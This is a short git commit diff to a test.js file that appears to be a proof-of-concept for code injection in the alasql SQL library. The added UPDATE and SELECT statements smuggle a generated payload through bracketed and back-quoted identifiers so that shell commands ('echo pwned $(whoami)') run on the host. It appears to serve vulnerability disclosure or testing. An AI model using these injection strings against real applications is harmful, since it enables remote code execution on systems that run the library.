0d0c186414768576a4cfda9f29939577c1e5938a
vr2 <hydw9898@gmail.com>
2024-11-15 15:27:19 +0900

    Update test.js

--- test.js
+++ test.js
@@ -7,5 +7,7 @@ new Function(
 
 alasql('CREATE table i_am_a_table;' +
     INSERT INTO i_am_a_table VALUES (1337); +
-    UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;
+    UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42; +
+    SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+']; +
+    SELECT \'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\ from i_am_a_table where 1;
 );
